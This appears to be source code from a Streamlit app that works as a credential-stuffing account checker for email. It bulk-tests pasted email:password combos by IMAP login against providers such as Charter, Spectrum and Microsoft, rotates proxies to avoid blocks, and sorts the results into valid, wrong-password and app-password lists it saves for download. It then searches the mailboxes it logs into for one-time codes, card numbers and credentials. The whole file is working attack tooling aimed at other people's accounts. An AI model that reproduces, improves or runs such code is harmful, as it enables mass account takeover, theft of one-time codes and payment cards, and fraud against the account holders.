def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str],
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH",
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    if log_target == "SEARCH":
        st.session_state.search_diag_logs = []
        log_func = search_log
    elif log_target == "OTP":
        st.session_state.otp_diag_logs = []
        log_func = otp_log
    else:
        log_func = debug_log
        st.session_state.folder_debug_logs = []

    messages = []
    start_time = time.time()

    clean_query = search_query.strip()
    log_func(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    log_func(f"🔎 [SEARCH SPECS] Query: '{clean_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    # The cache writer is held off for the whole loop. save_session_cache()
    # serialises up to 40 messages WITH base64 raw blobs; letting log() trigger it
    # mid-fetch is what made a search appear to hang. _cache_resume() writes ONCE
    # in the finally below, so there is no explicit save at the end.
    _cache_pause()
    try:
        # ------------------------------------------------------------------
        # PHASE 1 - collect every matching (folder, id) across the whole scope,
        # so pagination is GLOBAL. Slicing inside the folder loop gave page_size
        # rows per folder (3 folders x 15 = 45 rows on "page 1") while the pager
        # counted the sum, so pages overlapped and repeated.
        # ------------------------------------------------------------------
        collected = []
        for f_label in target_folders:
            real_imap_folder = get_imap_path(f_label)
            real_imap_encoded = encode_imap_utf7(real_imap_folder)
            log_func(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}' (Encoded: '{real_imap_encoded}')")

            try:
                sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
                log_func(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")

                if sel_typ != "OK":
                    log_func(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                    continue

                if mode == "FOLDER_ONLY" or not clean_query:
                    log_func("  ├─ [EXECUTING COMMAND] mail.search(None, 'ALL')")
                    typ, data = mail.search(None, "ALL")
                else:
                    field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                    terms = clean_query.split()

                    if len(terms) > 1:
                        # 25 -> 60. The preset keyword lists are ~15 terms and a
                        # custom override can be longer; the tail was dropped
                        # without a word.
                        max_terms = 60
                        log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords, using the first {min(len(terms), max_terms)}. Executing individual IMAP fetches...")
                        matched_ids_set = set()
                        for t_idx, term in enumerate(terms[:max_terms], 1):
                            log_func(f"  │   ├─ [Term #{t_idx}/{min(len(terms), max_terms)}]: '{term}'")
                            sub_typ, sub_data = execute_imap_search_safely(mail, field_cmd, term, log_func)
                            if sub_typ in ("OK", "OK_FALLBACK") and sub_data and sub_data[0]:
                                found_ids = (sub_data[0] or b"").split()
                                matched_ids_set.update(found_ids)
                                log_func(f"  │   └─ Matches for '{term}': {len(found_ids)} IDs")
                        typ = "OK"
                        data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
                    else:
                        log_func(f"  ├─ [SINGLE-TERM SEARCH] Querying term: '{clean_query}' via field '{field_cmd}'")
                        typ, data = execute_imap_search_safely(mail, field_cmd, clean_query, log_func)

                log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
                ids = (data[0] or b"").split() if typ in ("OK", "OK_FALLBACK") and data else []

                if sort_order == "Newest First":
                    ids = list(reversed(ids))

                log_func(f"  ├─ [FOLDER MATCHES] '{f_label}' returned {len(ids)} IDs.")
                for mid in ids:
                    collected.append((f_label, mid))

            except (socket.timeout, TimeoutError):
                log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
            except MsVerdict as mv:
                log_func(f"  └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
                raise
            except Exception as ex:
                log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

        total_matched_all_folders = len(collected)

        # ------------------------------------------------------------------
        # PHASE 2 - one global slice, clamped so an out-of-range page still shows
        # something instead of a blank screen.
        # ------------------------------------------------------------------
        total_pages_here = max(1, math.ceil(total_matched_all_folders / max(1, page_size)))
        page_number = max(1, min(int(page_number or 1), total_pages_here))
        start_idx = (page_number - 1) * page_size
        end_idx = start_idx + page_size
        target_slice = collected[start_idx:end_idx]

        log_func(f"  ├─ [PAGINATION RANGE] Global matches: {total_matched_all_folders} | Page {page_number}/{total_pages_here} | Slice ({start_idx}:{end_idx}) = {len(target_slice)} IDs")

        last_sel = None
        for idx, (f_label, mid) in enumerate(target_slice, 1):
            try:
                real_imap_folder = get_imap_path(f_label)
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                # the return was ignored, so a folder that failed to open had its
                # messages fetched from whatever was selected before it.
                if last_sel != real_imap_encoded:
                    sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
                    if sel_typ != "OK":
                        log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ SELECT '{f_label}' failed "
                                 f"({sel_typ} {sel_data}) - skipped.")
                        last_sel = None
                        continue
                    last_sel = real_imap_encoded

                msg_start = time.time()

                # NO PARTIAL FETCH. BODY.PEEK[]<0.262144> cut every message at
                # 256 KB, so the body view was short, the regexes missed whatever
                # followed, and mailview had to dial the server again to complete
                # it. One full fetch here costs less than that second round trip
                # and removes the truncation outright.
                typ, msgdata = mail.fetch(mid, "(FLAGS BODY.PEEK[])")

                if not msgdata or not isinstance(msgdata[0], tuple):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text, html_text = "", ""
                if msg.is_multipart():
                    for part in msg.walk():
                        ctype = part.get_content_type()
                        if ctype == "text/plain" and not body_text:
                            body_text = _part_text(part)
                        elif ctype == "text/html" and not html_text:
                            html_text = _part_text(part)
                else:
                    _single = _part_text(msg)
                    if msg.get_content_type() == "text/html":
                        html_text = _single
                    else:
                        body_text = _single
                if not body_text.strip() and html_text:
                    body_text = html_to_text(html_text)

                # extortion mail is TAGGED now, not dropped. It used to be
                # `continue`d, so a ransom mail appeared in no stream at all.
                _extortion = is_extortion_spam(subject, body_text, frm)

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                if st.session_state.get("otp_regex_chk", True):
                    cards, creds = extract_credentials_and_cards(body_text)
                else:
                    cards, creds = [], []
                detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                if _extortion and "🕵️ EXTORTION / RANSOM" not in detected_categories:
                    detected_categories.append("🕵️ EXTORTION / RANSOM")
                is_bot = len(detected_categories) > 0

                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "categories": detected_categories,
                    "body": cleaned_body,
                    "body_raw": body_text,
                    "pins": pins,
                    "links": links,
                    "cards": cards,
                    "creds": creds,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })

                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                log_func(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
                )

            except (socket.timeout, TimeoutError):
                log_func(f"  │   └─ ❌ [TIMEOUT ERROR] Message {mid!r} in '{f_label}' timed out.")
            except MsVerdict as mv:
                log_func(f"  │   └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
                raise
            except Exception as ex:
                log_func(f"  │   └─ ❌ [EXCEPTION ERROR] Message {mid!r} in '{f_label}' failed: {ex}")

        total_elapsed = round(time.time() - start_time, 2)

        # The pager must count MATCHES, not the rows on this page. The true match
        # total drives the pager; the page row count is stored separately so the
        # header can show the post-filter reality.
        page_rows = len(messages)
        if log_target == "SEARCH":
            st.session_state.search_total_matched_count = total_matched_all_folders
            st.session_state.search_page_rows = page_rows
        elif log_target == "OTP":
            st.session_state.otp_total_matched_count = total_matched_all_folders
            st.session_state.otp_page_rows = page_rows
        else:
            st.session_state.total_matched_count = total_matched_all_folders
            st.session_state.stream_page_rows = page_rows

        log_func(f"\n🏁 [ENGINE COMPLETE] Page messages: {page_rows} | Global matches: "
                 f"{total_matched_all_folders} | Execution time: {total_elapsed}s")
        return messages
    finally:
        _cache_resume()
# @@END 026 SEARCH_AND_FETCH


# @@BLOCK 027 HERO_AND_VALID deps=001,026
# Header (theme-synced from app.py's Theme Studio)
hero(
    "🚀📥 Bobito Mailbox Reader & Portal Hub Advanced IMAP Client",
    "Interactive Bot Intelligence, Dedicated OTP/Debit Card & Credentials Scanner, "
    "Multi-Field Search, Telegram/Blacklist Filter, Deep Diagnostic Instrumentation.",
    tags=["OTP Scanner", "Card / Debit", "Telegram Filter", "Bot Purge", "Deep Search", "Microsoft XOAUTH2"],
)

render_flash()

st.caption(
    f"Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & "
    f"Credentials Scanner, Multi-Field Search, Telegram/Blacklist Filter, and Deep Diagnostic Instrumentation. "
    f"— Theme in use: **{THEME.get('preset', DEFAULT_PRESET)}** (synced from the checker)"
)

# v13.48: Display Fit sits UNDER the header. It used to be called from block 001,
# which put both of its expanders above the hero and pushed the page title down -
# the exact thing fit() and fit_panel() were split apart to avoid. Call it once,
# here, and only here: a second call raises inside its own try/except.
auth.fit_panel(st)

valid = load_valid()
# @@END 027 HERO_AND_VALID


# @@BLOCK 028 DELETION_MANAGER deps=027
# --- Account Deletion Manager ---
with st.expander("🗑️ Account Deletion Manager", expanded=False):
    st.markdown("#### Permanent Account Deletion Options")
    clean_valid_accounts_list = valid_combos(valid)

    if clean_valid_accounts_list:
        # The mode selectbox is validated before it is built. Its options are
        # static, so a bad key can only arrive from a stale session, but the
        # check costs one comparison and removes the class of error entirely.
        _DEL_MODES = ["-- Choose Action --", "Delete Selected Valid Account(s)", "Delete ALL Valid Accounts"]
        if st.session_state.get("del_action_mode_sel") not in _DEL_MODES:
            st.session_state["del_action_mode_sel"] = _DEL_MODES[0]

        del_action_mode = st.selectbox(
            "Select Deletion Mode",
            _DEL_MODES,
            key="del_action_mode_sel"
        )

        if del_action_mode == "Delete Selected Valid Account(s)":
            if "select_all_accounts_chk" not in st.session_state:
                st.session_state["select_all_accounts_chk"] = False

            # v13.56: THE MULTISELECT USED TO OUTLIVE ITS OWN OPTIONS.
            # `accounts_to_del_multiselect` keeps its values across a rerun while
            # clean_valid_accounts_list shrinks by whatever was just deleted, and
            # st.multiselect raises "Every Multiselect default value must exist in
            # options" when a stored value is no longer offered. Pruning here is
            # legal because neither widget below exists yet this run.
            _del_stored = st.session_state.get("accounts_to_del_multiselect")
            if not isinstance(_del_stored, list):
                st.session_state["accounts_to_del_multiselect"] = []
            else:
                _del_kept = [a for a in _del_stored if a in clean_valid_accounts_list]
                if _del_kept != _del_stored:
                    st.session_state["accounts_to_del_multiselect"] = _del_kept
                    # the selection is now partial, so Select All would be lying
                    st.session_state["select_all_accounts_chk"] = False

            def toggle_select_all():
                if st.session_state.select_all_accounts_chk:
                    st.session_state.accounts_to_del_multiselect = list(clean_valid_accounts_list)
                else:
                    st.session_state.accounts_to_del_multiselect = []

            col_sel1, col_sel2 = st.columns([3, 1])
            with col_sel2:
                st.markdown("<br>", unsafe_allow_html=True)
                st.checkbox("Select All", key="select_all_accounts_chk", on_change=toggle_select_all)

            with col_sel1:
                selected_accounts_to_delete = st.multiselect(
                    "Select Account(s) to Permanently Delete",
                    clean_valid_accounts_list,
                    key="accounts_to_del_multiselect"
                )

            if selected_accounts_to_delete:
                if st.button("🗑️ Permanently Delete Selected Account(s)", type="primary", width="stretch"):
                    for acc in selected_accounts_to_delete:
                        delete_specific_account_from_storage(acc)
                    flash(f"Permanently deleted {len(selected_accounts_to_delete)} account(s).")
                    save_session_cache()
                    st.rerun()

        elif del_action_mode == "Delete ALL Valid Accounts":
            st.warning("⚠️ Warning: This will permanently remove all stored valid accounts from local record files!")
            confirm_all = st.checkbox("I confirm I want to delete ALL valid accounts permanently", key="confirm_del_all_checkbox")
            if confirm_all:
                if st.button("🚨 Permanently Delete ALL Accounts", type="primary", width="stretch"):
                    clear_all_valid_accounts_storage()
                    flash("Permanently deleted all valid accounts.")
                    save_session_cache()
                    st.rerun()
    else:
        st.caption("No valid accounts currently available for deletion.")
# @@END 028 DELETION_MANAGER


# @@BLOCK 029 ACCOUNT_PICKER deps=028
# --- Keyboard Search & Filter Box ---
account_filter_query = st.text_input("🔍 Filter Valid Accounts (Type to search with keyboard)", placeholder="Type email, domain, or timestamp...").strip().lower()

if account_filter_query:
    filtered_options = []
    i = 0
    while i < len(valid):
        item = valid[i]
        if item.startswith("# Found:"):
            if i + 1 < len(valid) and account_filter_query in valid[i+1].lower():
                filtered_options.append(item)
                filtered_options.append(valid[i+1])
            i += 2
        else:
            if account_filter_query in item.lower():
                filtered_options.append(item)
            i += 1
    valid_dropdown_options = filtered_options if filtered_options else ["none"]
else:
    valid_dropdown_options = valid if valid else ["none"]

# Preselect: forced_account wins, else last used. The widget itself owns the
# key afterwards, so we seed/repair the key BEFORE the widget is created.
default_index = 0
if st.session_state.get("forced_account") in valid_dropdown_options:
    default_index = valid_dropdown_options.index(st.session_state["forced_account"])
else:
    last_acc = load_last_account()
    if last_acc in valid_dropdown_options:
        default_index = valid_dropdown_options.index(last_acc)

_pending_sel = st.session_state.pop("_pending_selected_account", None)
if _pending_sel and _pending_sel in valid_dropdown_options:
    st.session_state["selected_account"] = _pending_sel

if st.session_state.get("selected_account") not in valid_dropdown_options:
    st.session_state["selected_account"] = (
        valid_dropdown_options[default_index] if valid_dropdown_options else "none"
    )

pick = st.selectbox("Valid account", valid_dropdown_options, key="selected_account")

actual_pick = "none"
if pick and pick != "none":
    if pick.startswith("# Found:"):
        st.warning("Please select the email:password combo below the timestamp (timestamps are non-clickable labels).")
        actual_pick = "none"
    else:
        actual_pick = pick.strip()

if actual_pick and actual_pick != "none" and ":" in actual_pick:
    save_last_account(actual_pick)
    save_session_cache()
# @@END 029 ACCOUNT_PICKER


# @@BLOCK 030 SIDEBAR_HUB deps=029
st.sidebar.header("Account & Connection Hub")

st.sidebar.checkbox(
    "🌐 Route mailbox connections through proxy",
    key="reader_use_proxy",
    help="Off (default) connects directly. On routes IMAP through the first proxy from proxies.txt. "
         "v13.37: the node is PROBED against the target host first and rotated on failure."
)

clean_download_lines = valid_combos(valid)
if clean_download_lines:
    valid_text_data = "\n".join(clean_download_lines)
    st.sidebar.download_button(
        label="📥 Download Valid Mail List",
        data=valid_text_data,
        file_name=f"valid_accounts_{len(clean_download_lines)}.txt",
        mime="text/plain",
        width="stretch"
    )

    zip_bytes = generate_all_mail_zip()
    st.sidebar.download_button(
        label="📦 Download All Mail Lists (ZIP)",
        data=zip_bytes,
        file_name="all_mail_results_bundle.zip",
        mime="application/zip",
        width="stretch"
    )
# @@END 030 SIDEBAR_HUB


# @@BLOCK 031 SIDEBAR_CONFIG deps=029
# App Configuration Settings Drawer
with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
    cfg = st.session_state.app_config

    # Every field is seeded and created key-only. They had NO key, so an edit
    # vanished on the next rerun before the Save button could see it, and value=
    # plus a key would warn once the key is seeded.
    # Both numbers are clamped into the widget range at seed time: a hand-edited
    # app_config.json holding 999 or port 0 would otherwise raise inside
    # st.number_input before the panel could render.
    if "cfg_timeout" not in st.session_state:
        try:
            _t = int(cfg.get("connection_timeout", 15))
        except (TypeError, ValueError):
            _t = 15
        st.session_state["cfg_timeout"] = max(5, min(300, _t))
    if "cfg_port" not in st.session_state:
        try:
            _p = int(cfg.get("imap_port", 993))
        except (TypeError, ValueError):
            _p = 993
        st.session_state["cfg_port"] = max(1, min(65535, _p))
    if "cfg_fallback" not in st.session_state:
        st.session_state["cfg_fallback"] = bool(cfg.get("auto_fallback_probing", True))
    if "cfg_starttls" not in st.session_state:
        st.session_state["cfg_starttls"] = bool(cfg.get("try_starttls", True))
    if "cfg_altuser" not in st.session_state:
        st.session_state["cfg_altuser"] = bool(cfg.get("try_alt_username", True))
    if "cfg_selfsigned" not in st.session_state:
        st.session_state["cfg_selfsigned"] = bool(cfg.get("allow_self_signed", True))

    new_timeout = st.number_input("Connection Timeout (seconds)", min_value=5, max_value=300, key="cfg_timeout")
    new_port = st.number_input("Default IMAP Port", min_value=1, max_value=65535, key="cfg_port")
    new_fallback = st.checkbox("Enable Auto-Fallback Host Probing (Spectrum/Charter/TWC)", key="cfg_fallback")
    new_starttls = st.checkbox(
        "Try STARTTLS upgrade on port 143 (plaintext 143 still tried either way)",
        key="cfg_starttls",
        help="Ticked: the ladder is implicit-TLS on the configured port, then STARTTLS on 143, "
             "then cleartext 143. Unticked: the STARTTLS rung is skipped entirely, but the "
             "cleartext 143 rung still runs so legacy servers stay reachable."
    )
    new_altuser = st.checkbox("Try local-part username on auth failure", key="cfg_altuser")
    new_selfsigned = st.checkbox(
        "Allow self-signed / expired certificates",
        key="cfg_selfsigned",
        help="Untick to require a valid, hostname-matching certificate. This setting was in the "
             "config file but the page hardcoded verify=False in both the implicit and STARTTLS rung, "
             "so it could never take effect."
    )

    if st.button("💾 Save App Settings", type="secondary", width="stretch"):
        st.session_state.app_config["connection_timeout"] = new_timeout
        st.session_state.app_config["imap_port"] = new_port
        st.session_state.app_config["auto_fallback_probing"] = new_fallback
        st.session_state.app_config["try_starttls"] = new_starttls
        st.session_state.app_config["try_alt_username"] = new_altuser
        st.session_state.app_config["allow_self_signed"] = new_selfsigned
        save_app_config(st.session_state.app_config)
        flash("App configuration updated and saved.")
        st.rerun()
# @@END 031 SIDEBAR_CONFIG


# @@BLOCK 032 SIDEBAR_BATCH deps=031
def append_result(kind: str, line: str) -> None:
    """Append one outcome to its results file. v13.40: only VALID was ever
    persisted; WRONG / APPASS / FAILED vanished on refresh."""
    # v13.43: the results dir was shared, so every user's wrong/appass/failed
    # rows leaked into the other users' valid list and into their ZIP.
    path = user_file(f"mail_results/{kind}.txt")
    key = _combo_of(line).lower()
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        rows = []
        if os.path.exists(path):
            with open(path, encoding="utf-8", errors="ignore") as f:
                for old in f:
                    old = old.rstrip("\n")
                    if not old.strip():
                        continue
                    if _combo_of(old).lower() == key:
                        continue
                    rows.append(old)
        rows.append(line)
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("\n".join(rows) + "\n")
        os.replace(tmp, path)
    except Exception:
        pass


# Batch Account Importer & Validator Bar
st.sidebar.markdown("---")
st.sidebar.subheader("📋 Batch Account Importer & Validator")
batch_paste_input = st.sidebar.text_area(
    "Paste Multiple Accounts (email:pass)",
    key="batch_paste_text",
    placeholder="user1@charter.net:pass1\nuser2@spectrum.net:pass2",
    height=110
)
batch_host_override_input = st.sidebar.text_area(
    "Batch IMAP Host Overrides (comma, semicolon or newline separated)",
    key="batch_host_ov",
    placeholder="mobile.charter.net\nimap.spectrum.net",
    height=80
)

if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", width="stretch"):
    raw_lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
    # v13.40: duplicates were re-validated and re-tabled.
    _seen, lines = set(), []
    for _l in raw_lines:
        _k = _combo_of(_l).lower()
        if _k and _k not in _seen:
            _seen.add(_k)
            lines.append(_l)

    if not lines:
        st.sidebar.error("Please paste at least one account in email:password format.")
    else:
        batch_logs = []
        table_rows = []
        valid_count = 0
        wrong_count = 0
        appass_count = 0
        login_drop_count = 0                       # v13.39
        failed_count = 0

        progress_bar = st.sidebar.progress(0)
        status_display = st.sidebar.empty()

        start_run_time = datetime.now()
        start_time_str = start_run_time.strftime("%Y-%m-%d %H:%M:%S")
        timestamp_str = f"# Started:{start_time_str}"
        new_valid_entries = [timestamp_str]

        cfg_timeout = st.session_state.app_config.get("connection_timeout", 15)
        cfg_port = st.session_state.app_config.get("imap_port", 993)
        cfg_alt_user = st.session_state.app_config.get("try_alt_username", True)

        user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
        active_proxy_pool = [
            {
                "proxy": (p or {}).get("proxy"),
                "country": (p or {}).get("country", "?"),
                "region": (p or {}).get("region", "?"),
            }
            for p in (load_app_proxies() or [{"proxy": None, "country": "Direct", "region": "-"}])
        ]

        for idx, line in enumerate(lines):
          try:
            clean_line = _combo_of(line)
            row_time = datetime.now().strftime("%H:%M:%S")
            proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]

            if ":" not in clean_line:
                failed_count += 1
                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Invalid format: {line}")
                table_rows.append({
                    "Time": row_time,
                    "Status": "FAILED",
                    "Email:Password": line,
                    "Under-The-Hood Background Trace": f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Result: Invalid format (missing colon delimiter)"
                })
                continue

            email_val, pass_val = clean_line.split(":", 1)
            email_val = email_val.strip()
            pass_val = pass_val.strip()

            # v13.40: 'foo:bar' was dialled against imap.gmail.com.
            if "@" not in email_val or "." not in email_val.split("@")[-1] or not pass_val:
                failed_count += 1
                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Not a usable email:pass — {clean_line}")
                table_rows.append({
                    "Time": row_time,
                    "Status": "FAILED",
                    "Email:Password": clean_line,
                    "Under-The-Hood Background Trace": "Rejected before dialling: missing '@', a dotted domain, or an empty password"
                })
                continue

            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
            progress_bar.progress((idx + 1) / len(lines))

            domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""

            cfg_fallback = st.session_state.app_config.get("auto_fallback_probing", True)
            if user_host_overrides:
                hosts_to_test = list(user_host_overrides)
                for h in candidate_hosts(email_val):
                    if h not in hosts_to_test:
                        hosts_to_test.append(h)
            elif cfg_fallback:
                hosts_to_test = candidate_hosts(email_val)
            else:
                # v13.40: auto_fallback_probing was saved and never read.
                _d = email_val.split("@")[-1].lower() if "@" in email_val else ""
                hosts_to_test = [f"imap.{_d}"] if _d else []

            # Zero-access guard: never let the loop be a no-op
            if not hosts_to_test:
                hosts_to_test = [f"imap.{domain_lower}", f"mail.{domain_lower}", domain_lower]

            # v13.40: proton/tuta were dialled on ~20 dead hosts first.
            if domain_lower in ZERO_ACCESS_PROVIDERS:
                hosts_to_test = hosts_to_test[:1]

            is_success = False
            status_type = "FAILED"
            connected_h = ""
            err_msg = ""
            auth_err = ""
            ms_verdict = None                              # v13.37
            trace_steps = []

            users_to_try = username_candidates(email_val) if cfg_alt_user else [email_val]

            # v13.40: cap the ladder. 20 hosts x 2 users x 15 s looked hung.
            max_hosts = 6 if not user_host_overrides else 12
            for h in hosts_to_test[:max_hosts]:
                test_m = None
                try:
                    trace_steps.append(f"Attempting IMAP TLS -> Host: {h}:{cfg_port} (STARTTLS/plain fallback enabled)")
                    _retries = max(0, int(st.session_state.app_config.get("max_batch_retries", 1)))
                    test_m = None
                    for _attempt in range(_retries + 1):
                        try:
                            test_m = connect_and_login(h, cfg_port, cfg_timeout,
                                                       proxy_item.get("proxy"),
                                                       users_to_try, pass_val, email_val)
                            break
                        except MsVerdict:
                            raise
                        except Exception as _re:
                            if _attempt >= _retries or not _looks_like_network_error(str(_re)):
                                raise
                            trace_steps.append(f"Retry {_attempt + 1}/{_retries} on {h}: {_re}")
                    trace_steps.append(f"Authenticated as '{email_val}'")
                    test_m.logout()
                    connected_h = h
                    is_success = True
                    status_type = "VALID"
                    trace_steps.append(f"Successfully authenticated against {h}:{cfg_port}")
                    break
                except MsVerdict as mv:                    # v13.37: definitive
                    ms_verdict = mv
                    err_msg = mv.detail
                    trace_steps.append(f"Microsoft verdict {mv.verdict}: {mv.detail}")
                    if test_m:
                        try:
                            test_m.logout()
                        except Exception:
                            pass
                    break
                except Exception as ex:
                    err_msg = str(ex)
                    if not auth_err and _looks_like_auth_error(err_msg):
                        auth_err = err_msg
                    trace_steps.append(f"Failed {h}: {err_msg}")
                    if test_m:
                        try:
                            test_m.logout()
                        except Exception:
                            pass

            if not is_success and ms_verdict is None and not err_msg:
                err_msg = "no host answered"

            _path = st.session_state.get("_last_socket_path", "direct")
            full_trace = f"Proxy: {proxy_item['proxy']} | Path: {_path} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or (hosts_to_test[0] if hosts_to_test else '-')} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)

            if is_success:
                valid_count += 1
                found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                combo_str = f"{email_val}:{pass_val}"
                new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
            elif ms_verdict is not None:
                if ms_verdict.verdict == "WRONG":
                    wrong_count += 1
                    status_type = "WRONG"
                    append_result("wrong_passwords", f"{email_val}:{pass_val} | {ms_verdict.detail}")
                else:
                    appass_count += 1
                    status_type = "APPASS"
                    append_result("app_password_2fa", f"{email_val}:{pass_val} | {ms_verdict.detail}")
                batch_logs.append(f"{'❌' if status_type == 'WRONG' else '🔑'} [{row_time}] [{status_type}] {email_val} — {ms_verdict.detail}")
            else:
                # App-password wins over auth, network errors never count as WRONG
                classify_src = auth_err or err_msg
                if domain_lower in ZERO_ACCESS_PROVIDERS:
                    appass_count += 1
                    status_type = "APPASS"
                    append_result("app_password_2fa", f"{email_val}:{pass_val} | no standard IMAP endpoint")
                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — provider has no standard IMAP (needs app password / bridge)")
                elif _looks_like_app_password_error(classify_src):
                    appass_count += 1
                    status_type = "APPASS"
                    append_result("app_password_2fa", f"{email_val}:{pass_val} | {classify_src}")
                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {classify_src}")
                elif _looks_like_auth_error(classify_src) and not _looks_like_network_error(classify_src):
                    wrong_count += 1
                    status_type = "WRONG"
                    append_result("wrong_passwords", f"{email_val}:{pass_val} | {classify_src}")
                    batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {classify_src}")
                elif _looks_like_login_drop(classify_src):
                    login_drop_count += 1
                    status_type = "LOGIN_DROPPED"
                    append_result("login_dropped_retry", f"{email_val}:{pass_val} | {classify_src}")
                    batch_logs.append(
                        f"🚪 [{row_time}] [LOGIN_DROPPED] {email_val} — server answered then closed "
                        f"the socket (* BYE); the password is still UNTESTED — {classify_src}")
                else:
                    failed_count += 1
                    status_type = "FAILED"
                    append_result("connection_failed", f"{email_val}:{pass_val} | {err_msg}")
                    batch_logs.append(f"⚠️ [{row_time}] [FAILED] {email_val} — {err_msg}")

            table_rows.append({
                "Time": row_time,
                "Status": status_type,
                "Email:Password": f"{email_val}:{pass_val}",
                "Under-The-Hood Background Trace": full_trace
            })
          except Exception as row_ex:
            # v13.40: one unexpected row error used to abort the whole batch.
            failed_count += 1
            batch_logs.append(f"⚠️ [{datetime.now().strftime('%H:%M:%S')}] [FAILED] {line} — row error: {row_ex}")
            table_rows.append({
                "Time": datetime.now().strftime("%H:%M:%S"),
                "Status": "FAILED",
                "Email:Password": line,
                "Under-The-Hood Background Trace": f"Row-level exception: {row_ex}"
            })

        progress_bar.empty()
        status_display.empty()

        end_run_time = datetime.now()
        duration_delta = end_run_time - start_run_time
        dur_str = str(duration_delta).split(".")[0]
        if len(dur_str) == 5:
            dur_str = f"0:{dur_str}"

        st.session_state.batch_run_meta = {
            "started": start_time_str,
            "ended": end_run_time.strftime("%Y-%m-%d %H:%M:%S"),
            "duration": dur_str
        }

        st.session_state.batch_stats = {
            "valid": valid_count,
            "wrong": wrong_count,
            "appass": appass_count,
            "login_dropped": login_drop_count,          # v13.39
            "failed": failed_count
        }
        st.session_state.batch_results_table = table_rows
        st.session_state.batch_validation_logs = batch_logs

        if valid_count > 0:
            # v13.37: MERGE (deduped by email) instead of blind prepend, so the
            # engine's overwrite and this page's write can no longer fight.
            merge_into_clean_valid(new_valid_entries[1:])

        save_session_cache()
        flash(f"Batch validation complete. Valid: {valid_count}, Wrong: {wrong_count}, AppPass: {appass_count}, Dropped: {login_drop_count}, Failed: {failed_count}")
        st.rerun()
# @@END 032 SIDEBAR_BATCH


# @@BLOCK 033 STREAM_TABS deps=032
# Live Execution Stream & Analytics Dashboard
st.markdown("---")
tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])

with tab_stream:
    if st.session_state.get("batch_validation_logs"):
        st.code("\n".join(st.session_state.batch_validation_logs), language="text")
    else:
        st.caption("No batch validation execution logs recorded yet. Run a batch validation from the sidebar.")

with tab_analytics:
    meta = st.session_state.get("batch_run_meta")
    if meta:
